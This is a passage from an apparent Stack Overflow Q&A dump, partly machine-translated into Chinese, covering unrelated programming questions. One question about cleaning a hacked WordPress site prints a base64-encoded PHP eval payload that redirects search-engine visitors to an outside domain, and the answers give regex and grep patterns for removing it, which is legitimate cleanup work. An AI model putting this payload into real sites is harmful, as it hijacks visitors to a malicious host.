<script language="javascript">
    var holdReqFlds = ["'15||Project Requested By'","'18||Project Title'","'20||Banner Details'","'202||Flyer Details'","'2134||If Gl Code Not above'","'5862||Quantity'"];
</script> 
```

**诚然，我只是在学习 json，所以这是我想不通的**：**如何将此值提供给我的外部 js 文件中的函数？**

下面是供参考的 javascript 函数 - 这将在 php 应用程序中单击提交按钮时运行。*简而言之 - 我将所有标记为所需的字段传递给 holdReqFlds 变量。然后该 var 将被传递给下面的 chkReq() 函数并确定字段是否在当前正在显示的字段集中*

**我需要将 holdReqFlds var 传递给外部 javascript 文件中的 chkReq() 函数：** **如何？**

```
 * ###################################
 *  PAGE ONSUBMIT FUNCTION
 * ###################################

function job_onsubmit(action)
{
function isVisible(field) {
    if (field.offsetWidth === 0 || field.offsetHeight === 0) return false;
}

function isBlank(field) {
    if ((field.type == "text" || field.type == "textarea") && field.value.length <= 0) return true;
    if (!(field.checked || field.selected || field.selectedIndex > -1)) return true;
    return false;
}

function chkReq(fieldList) {
    var field = null;
    var blankFields = [];
    for (var i = 0; i < fieldList.length; i++) {
        listItem = fieldList[i].split;
        fieldId = field[0];
        label = field[1];
        field = document.getElementById(fieldList[i].split("||")[0]);
        if (isVisible(field) && isBlank(field)) {
            blankFields[blankFields.length] = fieldList[i].split[1];
        }
    }
    if (blankFields.lentgh > 0) {
        displayError(blankFields);
        return false;
    } else {
        return true;
    }
}

function displayError(blankFields) {
    var msg = "Input required:\n\n";
    for (var i = 0; i < blankFields.length; i++) {
        msg += blankFields[i] + "\n";
    }
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:10:06.620

假设`holdReqFlds`在全局范围内可用，您只需执行以下操作：

```
var result = chkReq(holdReqFlds); 
```

另一件值得注意的事情是，您的 JSON 看起来很奇怪，因为每个值的双引号内都有单引号。您将这些值连接在一起的方式似乎很奇怪。您最好只构建实际对象并对其进行 JSON 编码，这样您就不必处理 javascript 中的任何字符串操作来获取值。尝试这样的事情：

```
while($RequireResult = mysql_fetch_object($results)) {
    $reqFlds[] = $row;
}

$json = json_encode($reqFlds); 
```

这将为您提供一个很好的对象数组，这些对象在 javascript 中更容易使用。

# cakephp - 如何解决 cakephp 密码重置模型验证错误

> ID：14346856
> 
> 赞同：0
> 
> 时间：2013-01-15T21:01:57.603
> 
> 标签：cakephp, passwords

我将 cakephp 2.0 [ACL 插件](http://goo.gl/Jp1iC)与 Voidet [SignMeUp 插件](http://goo.gl/vjMa9)相结合，以获得完整的用户管理（ACL、注册、忘记密码）。我已经完成了 SignMeUp 部分的 ACL 管理和注册工作。我遇到的问题是 SignMeUp 的忘记密码方法。

这是忘记密码的视图：

```
<h2>Reset Your Password</h2>
<p>Please enter your email address below:</p>
<?php
echo $this->Form->create();
echo $this->Form->input('email');
echo $this->Form->end('Reset Password'); 
```

这是 SignMeUp 忘记密码组件：

```
 public function forgottenPassword() {
    extract($this->settings);
    $model = $this->controller->modelClass;
    if (!empty($this->controller->request->data[$model])) {
        $data = $this->controller->request->data[$model];
    }

    //User has code to reset their password
    if (!empty($this->controller->request->params[$password_reset_field])) {
        $this->__generateNewPassword($model);
    } elseif (!empty($password_reset_field) && !empty($data['email'])) {
        $this->__requestNewPassword($data, $model);
    }
}

private function __generateNewPassword($model = '') {
    extract($this->settings);
    $user = $this->controller->{$model}->find('first', array(
        'conditions' => array($password_reset_field => $this->controller->request->params[$password_reset_field]),
        'recursive' => -1
    ));

    if (!empty($user)) {
        $password = substr(Security::hash(String::uuid(), null, true), 0, 8);
        $user[$model][$password_field] = Security::hash($password, null, true);
        $user[$model][$password_reset_field] = null;
        $this->controller->set(compact('password'));
        if ($this->controller->{$model}->save($user) && $this->__sendNewPassword($user[$model])) {
            if (!$this->controller->request->is('ajax')) {
                $this->Session->setFlash('Thank you '.$user[$model][$username_field].', your new password has been emailed to you.');
                $this->controller->redirect($this->Auth->loginAction);
            } else {
                return true;
            }
        }
    }
}

    private function __requestNewPassword($data = array(), $model = '') {
    extract($this->settings);
    $this->controller->loadModel($model);
    $user = $this->controller->{$model}->find('first', array('conditions' => array('email' => $data['email']), 'recursive' => -1));
    if (!empty($user)) {
        $user[$model][$password_reset_field] = md5(String::uuid());

        if ($this->controller->{$model}->save($user) && $this->__sendForgottenPassword($user[$model])) {
            if (!$this->controller->request->is('ajax')) {
                $this->Session->setFlash('Thank you. A password recovery email has now been sent to '.$data['email']);
                $this->controller->redirect($this->Auth->loginAction);
            } else {
                return true;
            }
        }
    } else {
        $this->controller->{$model}->invalidate('email', 'No user found with email: '.$data['email']);
    }
} 
```

这是用户模型代码：

```
 App::uses('AclManagementAppModel', 'AclManagement.Model');
    class User extends AclManagementAppModel {
    public $name = 'User';
    public $useTable = "users";
    public $actsAs = array('Acl' => array('type' => 'requester'), 'SignMeUp.SignMeUp');
    public $validate = array(
            'name' => array(
            'required' => false,
            'allowEmpty' => false,
            'rule' => 'notEmpty',
            'message' => 'You must enter your real name.'
        ),
        'email' => array(
            'email' => array(
                'required' => false,
                'allowEmpty' => false,
                'rule' => 'email',
                'message' => 'Invalid email.',
                'last' => true
            ),
            'unique' => array(
                'required' => false,
                'allowEmpty' => false,
                'rule' => 'isUnique',
                'message' => 'Email already in use.'
            )
        ),
        'password' => array(
            'required' => false,
            'allowEmpty' => false,
            'rule' => 'comparePwd',
            'message' => 'Password mismatch or less than 6 characters.'
        )
    );` 

public function comparePwd($check) {
    $check['password'] = trim($check['password']);

    if (!isset($this->data['User']['id']) && strlen($check['password']) < 6) {
        return false;
    }

    if (isset($this->data['User']['id']) && empty($check['password'])) {
        return true;
    }

    $r = ($check['password'] == $this->data['User']['password2'] && strlen($check['password']) >= 6);

    if (!$r) {
        $this->invalidate('password2', __d('user', 'Password missmatch.'));
    }

    return $r;
}` 
```

这是我在提交表单时收到的错误消息：

注意（8）：未定义索引：password2 [APP\Plugin\AclManagement\Model\User.php，第 119 行]

与此消息相关的代码是：

```
$r = ($check['password'] == $this->data['User']['password2'] && strlen($check['password']) >= 6); 
```

上下文指出：

```
$check = array(
'password' => '*****' 
```

)

所以，我想了解的是如何处理来自用户模型的这个错误。说得通？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T22:37:53.043

从这个错误

> 注意（8）：未定义索引：password2 [APP\Plugin\AclManagement\Model\User.php，第 119 行]

而这个错误上下文：

```
$check = array(
     'password' => '*****'
); 
```

传递给保存的数据缺少该字段`password2`。

## 调用 save 更新密码

看起来相关的功能是：`__generateNewPassword`. 只需确保两者`password`和`password2`都具有相同的值，它应该可以工作：

```
private function __generateNewPassword($model = '') {
    ...

    if (!empty($user)) {
        $password = substr(Security::hash(String::uuid(), null, true), 0, 8);
        $hashedPw = Security::hash($password, null, true);
        $user[$model]['password'] = $hashedPw;
        $user[$model]['password2'] = $hashedPw;
        ... 
```

如果这不是导致错误的保存调用 - 检查错误堆栈跟踪以查看在您的情况下从何处调用保存。

请注意，验证功能是一个非常糟糕的实现。密码必须经过哈希处理才能正确存储 - “必须超过 6 个字符”的验证逻辑将该规则应用于始终为 40 个字符长*的哈希密码。*通过电子邮件发送密码也不是处理密码重置逻辑的最佳方式 - 要求用户自己设置新密码要好得多，而不是通过电子邮件以纯文本形式发送密码。

# android - Android SharedPreferences 备份

> ID：14346857
> 
> 赞同：0
> 
> 时间：2013-01-15T21:02:04.893
> 
> 标签：android, key, backup, sharedpreferences

我正在尝试使用`SharedPreferencesBackupHelper`. 据我了解，您首先要致电

```
SharedPreferencesBackupHelper helper = new SharedPreferencesBackupHelper(this, "KEY1", "KEY2"); 
```

我的问题是我正在做一个列表应用程序，在那里我使用单独的键备份每个列表项的数据。那是 a与 a 的`String`结合`int`。它看起来像这样：

```
spEdit.putString(Integer.toString(5) + "KEY_FOR_THIS", "value"); 
```

示例中的 5 当然可以更改，并且可以是任意数字，具体取决于用户添加了多少项目。`for`例如，有没有什么好的方法可以通过循环来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T16:38:02.200

您传递给`SharedPreferencesBackupHelper`' 构造函数的键不是 a`Preference`内部的键`SharedPreferences`：它是`SharedPreferences`文件的名称。也就是说，它是`String`你传递给的[`Context.getSharedPreferences(String,int)`](http://developer.android.com/reference/android/content/Context.html#getSharedPreferences%28java.lang.String,%20int%29)。如果您通过调用创建 SharedPreferences 文件[`Activity.getPreferences(int)`](http://developer.android.com/reference/android/app/Activity.html#getPreferences%28int%29)，则应传递该 Activity 的类名。

# xslt - XSL format-number without rounding

> ID：14346858
> 
> 赞同：3
> 
> 时间：2013-01-15T21:02:06.590
> 
> 标签：xslt, rounding

Is there anything similar to format-number in XSL that could take a number and format it like '#0.00' and not round it?

So,

*   5 would become 5.00
*   14.6 would become 14.60
*   1.375 would become 1.37

Just format-number doesn't work because it would round 1.375 to 1.38

```
<xsl:value-of select="format-number(MY_NUMBER, '#0.00')" /> 
```

This concatenation substring mess won't work for 5 (because there is no ".") and won't add a zero to the end of 14.6

```
<xsl:value-of select="concat(substring-before(MY_NUMBER,'.'), '.',  substring(substring-after(MY_NUMBER,'.'),1,2))" /> 
```

I'm I going to have to do a messy:

```
<xsl:choose>
    <xsl:when test=""></xsl:when>
    <xsl:otherwise></xsl:otherwise>
</xsl:choose> 
```

Thanks so much in advance!

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-16T00:45:16.440

我假设你被限制在 XSLT 1 所以像这样

```
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">
:
<xsl:call-template name="f">
<xsl:with-param name="n" select="5"/>
</xsl:call-template>
:
<xsl:call-template name="f">
<xsl:with-param name="n" select="14.6"/>
</xsl:call-template>
:
<xsl:call-template name="f">
<xsl:with-param name="n" select="1.375"/>
</xsl:call-template>
:
<xsl:call-template name="f">
<xsl:with-param name="n" select="-12.1234"/>
</xsl:call-template>
:
</xsl:template>

<xsl:template name="f">
<xsl:param name="n"/>
<xsl:value-of select="format-number(floor($n*1000) div 1000, '#0.00')"/>
</xsl:template>

</xsl:stylesheet> 
```

产生

```
:
5.00
:
14.60
:
1.38
:
-12.12
: 
```

# python - Example of python script calling batch, then python script recieving batch script result?

> ID：14346860
> 
> 赞同：-1
> 
> 时间：2013-01-15T21:02:11.993
> 
> 标签：python, batch-file

I am looking for an example of a python/batch script:

*   python script calls up the command line
*   python script passes a batch script (several lines) to the command line
*   batch script then executes in the command line
*   python script recieves the result of the batch script

I assume the solution would depend on some kind of special python library?

Would the task of combining python/batch be much easier if the processes starts in batch rather than in python (would this be a more common solution)?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:17:46.317

代码示例：

```
import subprocess
bat_text = "dir" # (text to write in bat file)
bat_file = open("program.bat","w") # (open file in write mode)
bat_file.write(bat_text) # (write bat_text on bat_file)
bat_file.close() # (close file)
command = "C:\program.bat" # (the location of bat file)
execute = subprocess.Popen(command, stdout=subprocess.PIPE)  # (exec the command)
output = execute.stdout.read() # (read output)
print output  # (print output) 
```

子流程教程

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:36:24.360

查看包含在标准库中的 subprocess 模块：

[http://docs.python.org/2/library/subprocess.html](http://docs.python.org/2/library/subprocess.html)

那里有很多例子。

# php - OpenID login facilitated by JavaScript?

> ID：14346861
> 
> 赞同：1
> 
> 时间：2013-01-15T21:02:15.003
> 
> 标签：php, javascript, openid, angularjs

I'm developing a webapp with AngularJS as my framework and I want to implement OpenID for login, specifically with Google.

I was using the LightOpenID library for PHP and that seemed simple enough, but I'm struggling as to how to incorporate that into my app since it depends on the page redirecting to Google. I've considered three ways to approach this:

1.  A `login.php` at my base directory that users have to pass through
2.  A partial that iframes `login.php`
3.  `login.php` opening in a popup like [http://openid-demo.appspot.com/](http://openid-demo.appspot.com/)

For the root solution (1), how do I go about passing state to the app?

The iframe solution (2) errors out on redirect `IFRAME: Refused to display document because display forbidden by X-Frame-Options`, which I suspect has to do with security on Google's end.

The popup solution (3) doesn't seem too great, as users have popup blockers, and popups on mobile aren't too satisfactory either.

Does anyone have any idea as to how I can work within the AngularJS framework/use JavaScript to sign users in with OpenID?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-24T13:53:36.147

You should be able to do (1) with a simple "logged in" session cookie, but that has problems as outlined here [http://www.espeo.pl/2012/02/26/authentication-in-angularjs-application](http://www.espeo.pl/2012/02/26/authentication-in-angularjs-application).

(2) doesn't work as OpenID providers will bust out of any frames to prevent potential security problems.

Which leaves (3), which I got working by using [https://github.com/witoldsz/angular-http-auth](https://github.com/witoldsz/angular-http-auth):

At my top level ngApp, I added the `http-auth-interceptor` dependency and added the following initializer function:

```
// main.js
app.run(function($rootScope, authService) {
    $rootScope.$on('event:auth-loginRequired', function() {
        window.open('/login.html');
    });
    $rootScope.loginConfirmed = function() {
        authService.loginConfirmed();
    };
}); 
```

When a json HTTP request returns a 401, the `http-auth-interceptor` will load `login.html` in a popup.

`login.html` is just a regular OpenID login form that eventually redirects to `login_confirmed.html`, which simply contains a `<script>` to close the popup and call the `loginConfirmed` function on the parent page:

```
<!-- login_confirmed.html -->
<script type="text/javascript">
    window.opener.loginConfirmed();
    window.close();
</script> 
```

I don't know if there's a better way to call back into the angular app than this little glue function:

```
<!-- main.html -->
<script type="text/javascript">
    function loginConfirmed() {
        angular.element($('html')).scope().loginConfirmed();
    }
</script> 
```

Anyway, pretty or not, it works.

# c++ - 模板调用中的c ++模板

> ID：14346865
> 
> 赞同：2
> 
> 时间：2013-01-15T21:02:39.083
> 
> 标签：c++, templates

关于 c++ 模板机制的一个小问题。假设我们有一个名为 Point 的类。现在假设“数据”是一个模板类/容器，只包含 T（模板）数据成员。也就是说，“数据”看起来或多或少是这样的：

```
Template <class T>
class Data {
T dMember;
……..
}; 
```

现在假设有人在 main.cpp 文件中使用此类并执行以下声明：

```
Data<Data<Point>> d; 
```

我试图完全了解创建的对象的外观。我试图使用编译器进入课堂通话，但无济于事。我知道 Data 需要初始化 Data 所以它会调用自己一次，但它在那里真正做了什么？是否有构造函数被激活？

谢谢你，盖伊

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T21:05:14.037

这就像`Data2`在以下示例中实例化：

```
class Data1 {
    Point dMember;
};

class Data2 {
    Data1 dMember;
};

Data2 d; // = Data<Data<Point>> d; 
```

基本上，一个包装的包装`Point`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T07:38:07.883

> 我知道 Data 需要初始化 Data 所以它会调用自己一次，但它在那里真正做了什么？是否有构造函数被激活？

数据并没有真正调用它一次。这是因为内部数据和外部数据是两个不同的类。一般来说，如果编译器看到`Data<Data<Point>>`，它首先识别内部部分，即`Data<Point>`。然后它*实例化*模板，这意味着它创建了一个具有模板描述的属性的类。重要的是要意识到 Data 不是一个类，而是一个可用于创建一大堆类的模板。这些类中的每一个都与其他类不同，它们是不同的类型，彼此之间没有真正的关系。模板的一个实例也是如此`Data<Point>`，它是一个具有相同属性的类，例如，

```
class Foo {
  Point dMember;
  ...
}; 
```

我就叫它Foo。编译器然后看到`Data<Data<Point>>`，这也可能是`Data<Foo>`。*它再次*实例化模板，这次使用 Foo（即它从第一次实例化得到的类）作为参数。它得到另一个类，原则上完全独立于第一个类，除了它具有第一个实例化类型的成员：

```
class Bar {
  Foo dMember;
  ...
}; 
```

就这样。数据不调用自己，数据甚至不作为一种类型*存在。*初始化中调用的构造函数是 Bar 的构造函数，而 Bar 的构造函数又会调用 Foo 的构造函数。您在 Data 中定义的构造函数并不是真正的构造函数，因为位于类模板中的任何东西都是模板本身。所以它是一个构造函数模板，如果你调用 Foo 和/或 Bar 的构造函数，编译器会使用该模板来实例化实际的构造函数。

数据只是编译器构建真实类（和成员函数，如果需要）的蓝图，它永远不会在那里播放或调用或初始化任何东西。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:49:21.780

Data< Point > 的模板为：

```
class Data<Point> {
  Point dMember;
  ...
}; 
```

Data< Data< Point>> 的模板为：

```
class Data<Data<Point>> {
  Data<Point> dMember;
  ...
}; 
```

在第二个中，Data< Point > 用作任何其他成员变量。

如果 Data<T> 有构造函数，它将被调用两次。首先是 Data< Point > 因为它是一个成员变量，并且首先调用它们的构造函数。然后为数据<数据<点>>。

# php - Using grep to remove malicious code from Wordpress php files

> ID：14346868
> 
> 赞同：1
> 
> 时间：2013-01-15T21:02:42.193
> 
> 标签：php, regex, windows, wordpress, virus

So basically a WordPress site that wasn't updated was compromised. I've downloaded the files, identified the infected, and I found a pattern.

At the top of the file there is code like the following

```
eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly93a3BiLjI1dS5jb20vIik7DQpleGl0KCk7DQp9Cn0KfQ0KfQ0KfQ==")); 
```

Or something close with different characters.

I'm using grepWin to remove the code from a few hundred PHP files. What regex code can I use that will remove code that begins with `eval(base64_decode(` followed by a long line of text and ended with `"));`. Not the text in between is different for some files.

~~[note - the code I used above was shorten, don't want to trigger any virus protectors with suspicious code]~~

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:13:36.067

匹配的正则表达式如下：

`/eval\(base64_decode\("[^\)]+\)\)\;/`

不过，对于 WinGrep，请使用此字符串。Windows grep 不喜欢周围的斜线。

`eval\(base64_decode\("[^\)]+\)\)\;`

然后只需替换为空字符串。Grep 通常不提供此替换功能，但我注意到您说您使用的是 WinGrep，它确实提供了全局替换功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-27T00:23:22.957

以下`grep`命令可能有助于查找此类文件：

```
grep -R return.*base64_decode  . 
```

或者：

```
grep --include=\*.php -rn 'return.*base64_decode($v.\{6\})' . 
```

但是，您应该为此使用特殊的扫描器，请参阅：[PHP 安全扫描器](https://stackoverflow.com/q/3056150/55075)。

# c# - Passing null for a short?

> ID：14346869
> 
> 赞同：3
> 
> 时间：2013-01-15T21:02:52.627
> 
> 标签：c#, .net

I have the following method:

```
 //returns -1 on failure
    public static int Add(
        string name, string email, string password, short defaultNumWeek)
    {
        KezberPMDBDataContext db = new KezberPMDBDataContext();
        Employee employee = new Employee 
        { 
            EmployeName = name,
            EmployeEmail = email,
            EmployePassword = password,
            DefaultNumWeek = defaultNumWeek
        };
        db.Employees.InsertOnSubmit(employee);
        try
        {
            db.SubmitChanges();
        }
        catch (Exception)
        {
            return -1;
        }

        return employee.EmployeID;
    } 
```

The last parameter is optional and can be null in the database. How can I do this without creating 2 separate methods? I have other ones that are less simple. How can I pass a base type as null?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T21:03:57.493

Use `Nullable` type as

```
public static int Add(
        string name, string email, string password, short? defaultNumWeek) 
```

`DefaultNumWeek` property of `Employee` mast be `Nullable` too.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T21:04:24.367

```
static void Bar(Nullable<short> s)
{

} 
```

or

```
static void Bar(short? s)
{

} 
```

The former is merely a short hand, see [Using Nullable Types](http://msdn.microsoft.com/en-us/library/2cf62fcy%28v=vs.80%29.aspx)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-15T21:05:38.860

将定义更改为：

```
public static int Add(
        string name, string email, string password, short? defaultNumWeek = null) 
```

这允许您在省略`defaultNumWeek`参数的同时调用相同的函数。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T21:05:05.883

只要传递它，如果它为空就不要使用它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-15T21:05:07.583

[您可以使用Nullable Types](http://msdn.microsoft.com/en-us/library/vstudio/1t3y8s4s.aspx)处理此问题。C# 有一个别名，您可以在其中将问号 (?) 附加到结构类型（如 short）。

这允许您将它与 null 进行比较，询问它是否有值等等。

# ios - 由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[__NSDictionaryI sizeWithFont:constrainedToSize:lineBreakMode:]

> ID：14346879
> 
> 赞同：2
> 
> 时间：2013-01-15T21:03:43.017
> 
> 标签：ios, uitableview, cell

我是一个新手程序员。已经晚上试图解决问题，但没有奏效。我正在尝试根据信息内容动态更改单元格的大小。举个例子，但是我的程序启动失败了。出现错误：

```
 'Terminating app due to uncaught exception 'NSInvalidArgumentException', 
reason: '-[__NSDictionaryI sizeWithFont:constrainedToSize:lineBreakMode:]" 
```

我究竟做错了什么？这是我的代码：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier] ;
    }

    NSDictionary *newsItem = [news objectAtIndex:indexPath.row];

    cell.textLabel.text = [newsItem objectForKey:@"title"];

    cell.textLabel.lineBreakMode = UILineBreakModeWordWrap;
    cell.textLabel.numberOfLines = 0;

    cell.detailTextLabel.text = [newsItem objectForKey:@"pubDate"];
    return cell;
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath
{
    NSString *cellText = [news objectAtIndex:indexPath.row];
    UIFont *cellFont = [UIFont fontWithName:@"Helvetica-Bold" size:20.0f];
    CGSize constraintSize = CGSizeMake(320.0f, MAXFLOAT);

    CGSize labelSize = [cellText sizeWithFont:cellFont
                            constrainedToSize:constraintSize
                                lineBreakMode:UILineBreakModeWordWrap];

    return labelSize.height + 20.0f;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T21:12:18.580

看来您的`news`数组中有字典，而不是字符串。所以在`tableView:heightForRowAtIndexPath:`你`NSString* cellText`的实际上是一个`NSDictionary*`.

你只需要像这样添加一个`objectForKey:`调用`objectAtIndex:`：

```
NSString *cellText = [[news objectAtIndex:indexPath.row] objectForKey:@"title"]; 
```

# jquery - check from a list of li which one is display block and get its html

> ID：14346880
> 
> 赞同：0
> 
> 时间：2013-01-15T21:03:48.903
> 
> 标签：jquery

i am trying to get html from the the list of li finding which one is display block and get that li's html. all i want is to get the html from the display:block li out of four li

```
 if ($('.fishes li').is(':visible'))
 {
 var price=$(this).find('span').html();
 alert(price);
 } 
```

but using this is not getting the value i want . its not taking out html from the display:block li . the click source is different.

the click source is `$(document).on("click", ".test", function()`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:10:00.693

在您发布的代码中，`$(this)`指的是`.test`元素。试试这个：

```
$(document).on("click", ".test", function() { 
    console.log($('.fishes li:visible').find('span').html());
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:19:43.247

通过使用这`$(".fishes li:not(.hidn)").find("span:first").html();`对我有用，将它分享给一些帮助谢谢

# macos - How to start a page with web view in the Xcode?

> ID：14346881
> 
> 赞同：0
> 
> 时间：2013-01-15T21:03:51.563
> 
> 标签：macos, cocoa, uiwebview

I see here that many using this code but do working with me. Well. (DESKTOP APP)

Simple webview auto laucher URL

I will go to talk step by step

1) Create a project

2) Create a window and a web view

3) Put the identifier how prevelwindow (web view) and windows (window)

4) In My .H

```
#import <Cocoa/Cocoa.h>
#import <WebKit/WebKit.h>

@interface AppDelegate : NSObject <NSApplicationDelegate> {
NSWindow *window;
WebView *prevelwindow;
}

@property (strong) IBOutlet NSWindow *window;
@property (strong) IBOutlet WebView *prevelwindow;
@end 
```

5) In My .M

```
#import "AppDelegate.h"

@implementation AppDelegate

@synthesize window;

@synthesize prevelwindow;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
NSString *urlString = @"http://www.google.com.br";

[[prevelwindow mainFrame] loadRequest:[NSURLRequest requestWithURL:[NSURL             URLWithString:urlString]]];
}

@end 
```

6) Well then I compile it and it is not working.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:27:11.627

首先，您必须添加![WebKit.framework](../Images/f9d29bb8b41e6ea87500a20bb4309423.png)( `Targets->Build Phases->Link Binary`)。

然后你可以`#import`在你的`.h AppDelegate`文件中声明一个新的`WebView`：

```
#import "WebKit/WebKit.h"

@interface Check_AccountzAppDelegate : NSObject <NSApplicationDelegate> {
    WebView *MyWebView;
}

@property (retain, nonatomic) IBOutlet WebView *MyWebView; 
```

现在您可以加载一个新的请求（`.m AppDelegate`文件）：

```
@synthesize MyWebView;

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    // Insert code here to initialize your application
    [[MyWebView mainFrame] loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://www.google.com"]]];
} 
```

最后添加一个 WebView，并将其连接到您`MyWebView` `IBOutlet`的`.nib`文件中：

新`WebView`： ![添加新的 Web 视图](../Images/3c59c153e1e198be2b652ab34025d9d2.png)

连接`IBOutlet`： ![奥特莱斯](../Images/58915375d2087b15cc4294ec3196c9cb.png)![网络对象](../Images/56892f7455dc4c89c35ab0eab5c805bb.png)

# php - "Your script possibly relies on a session side-effect"

> ID：14346882
> 
> 赞同：3
> 
> 时间：2013-01-15T21:03:53.220
> 
> 标签：php, warnings

> **Possible Duplicate:**
> [PHP session side-effect warning with global variables as a source of data](https://stackoverflow.com/questions/175091/php-session-side-effect-warning-with-global-variables-as-a-source-of-data)

The following message popped up:

> Warning: Unknown: Your script possibly relies on a session side-effect which existed until PHP 4.2.3\. Please be advised that the session extension does not consider global variables as a source of data, unless register_globals is enabled. You can disable this functionality and this warning by setting session.bug_compat_42 or session.bug_compat_warn to off, respectively in Unknown on line 0

after I input the following lines in my script:

```
$InnerJoinQuery = $STD->prepare("
SELECT Users.ID, Users.Password, UserInformation.LastName, UserInformation.Firstname, UserInformation.DOB
FROM Users
INNER JOIN UserInformation
ON Users.ID = UserInformation.UserID WHERE Users.Username = ?");
$InnerJoinQuery->bind_param('i', $_SESSION['real_name']);
#$InnerJoinArray = $InnerJoinQuery->fetch_array(MYSQLI_ASSOC);
$InnerJoinQuery->execute();
$InnerJoinQuery-> bind_result($UID, $Password, $LastName, $Firstname, $DOB);
$InnerJoinQuery->fetch(); 
```

and after doing some research into this message I appended the following changes to my php.ini

> register_globals = On

Then invoked:

> /etc/init.d/apache2 reload

the message was still present

what exactly does this warning mean?

**more importantly, why does the lines I added within my script invoke this warning, and not before?**

# shell - Shell commands: loading multiple values for variable from file

> ID：14346883
> 
> 赞同：2
> 
> 时间：2013-01-15T21:03:55.420
> 
> 标签：shell

I have to run the following command:

```
sudo trac-admin /var/www/trac/kpi wiki remove * 
```

* Doesn't work, so I need change it with actual wiki names.

I have wiki names saved in a file, every name on new line.

I would like to feed contents of file as variable per single line to the original command trac-admin. How do I do this?

command that helped me delete all wikis in trac was:

```
for x in `cat trac.kpi.wiki2`; do sudo trac-admin /var/www/trac/kpi wiki remove $x; done 
```

Thanks!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:07:34.753

我不确定我是否正确理解了您的问题，但也许可以尝试：

```
cat /var/www/trac/kpi | xargs sudo trac-admin wiki remove 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:06:57.293

您可以使用反引号`：

```
tmp]$ cat a.txt
foo
bar
baz
tmp]$ for x in `cat a.txt`; do echo $x; done
foo
bar
baz
tmp]$ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T21:06:38.377

用这个：

```
while IFS= read -r line; do
  sudo trac-admin /var/www/trac/kpi wiki remove $IFS;
done < /file/with/wiki/names 
```

# php - Remote host adding a \ before every " in textarea when PHP posted and saved to SQLite database

> ID：14346886
> 
> 赞同：0
> 
> 时间：2013-01-15T21:04:07.350
> 
> 标签：php, sqlite, remote-server, magic-quotes-gpc

The problem does not happen using the home WAMP server. I have tried two remote hosts with the same results. The textareas' hold some code that can be edited and later used on the website.

Eg: Correct data in textarea:

```
<form action="login.php" method="post"> 
```

After first posting to PHP and SQLite database:

```
